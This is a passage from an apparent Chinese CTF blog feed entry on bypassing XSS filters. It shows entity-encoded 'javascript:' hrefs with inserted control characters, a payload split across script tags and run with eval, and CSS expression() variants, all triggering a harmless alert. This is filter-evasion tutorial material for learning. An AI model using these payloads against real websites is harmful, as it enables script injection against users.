class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure><p>如果过滤了script，可以使用大小写绕过，如sCRiPt</p><p>第六种：<br>1.编码绕过。可以对标签属性值进行转码，来实现绕过在，转码后的要加分号。<br>字符a，对应ASCII码97，十进制编码&amp;#97，十六进制编码&amp;#x61。<br>字符e，对应ASCII码101，十进制编码&amp;#101，十六进制编码&amp;#x65。<br>2.另外，可以将以下字符插入到任意位置中：<br>Tab ==&gt; &amp;#9<br>换行 ==&gt; &amp;#10<br>回车 ==&gt; &amp;#13<br>3.可以将以下字符插入到头部位置。<br>SOH ==&gt; &amp;#01<br>STX ==&gt; &amp;#01<br>转码后例子如下：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">A</span> <span class="attr">href</span>=<span class="string">&quot;j<span class="symbol">&amp;#97;</span>v<span class="symbol">&amp;#x61;</span>script:laert(/xss/)&quot;</span>&gt;</span>click me!<span class="tag">&lt;/<span class="name">a</span>&gt;</span>//经过简单编码</span><br><span class="line"><span class="tag">&lt;<span class="name">A</span> <span class="attr">href</span>=<span class="string">&quot;<span class="symbol">&amp;#01;</span>j<span class="symbol">&amp;#97;</span>v<span class="symbol">&amp;#x61;</span>s<span class="symbol">&amp;#9;</span>c<span class="symbol">&amp;#10;</span>r<span class="symbol">&amp;#13;</span>ipt:laert(/xss/)&quot;</span>&gt;</span>click me!<span class="tag">&lt;/<span class="name">a</span>&gt;</span>//经过插入字符</span><br></pre></td></tr></table></figure><p>第七种：拆分跨站，将语句才分成多个，拼串起来后再执行。</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript">z=<span class="string">&#x27;alert&#x27;</span></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript">z=z+<span class="string">&#x27;(/xss/)&#x27;</span></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="built_in">eval</span>(z)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span>//ecal为执行函数，将后续的字符串当成语句执行。</span><br></pre></td></tr></table></figure><p>第八种：CSS中的变形。</p><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">width: ｅｘｐｒｅｓｓｉｏｎ（alert(<span class="regexp">/xss/</span>)）<span class="comment">//使用全角字符</span></span><br><span class="line">width:expre<span class="comment">/**/</span>ssion(alert(<span class="regexp">/xss/</span>))<span class="comment">//注释会被浏览器忽略</span></span><br><span class="line"></span><br><span class="line">&lt;style&gt;@<span class="keyword">import</span> <span class="string">&#x27;javas\cri\0pt:alert(/xss/)&#x27;</span>;&lt;<span class="regexp">/style&gt;/</span>/插入 \ 和 \<span class="number">0</span> 符号</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/4e70d466a031eaf51d182023d68f3ba3.jpg" alt=""></p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/e7ce9999bf5100125559bd6a2675bbef.jpg" alt=""></p>]]></content>
    
    
    <summary type="html">🥧xss漏洞</summary>
    
    
    
    <category term="CTF" scheme="https://example.com/categories/CTF/"/>
    
    
    <category term="web姿势" scheme="https://example.com/tags/web%E5%A7%BF%E5%8A%BF/"/>
    
  </entry>
  
</feed>
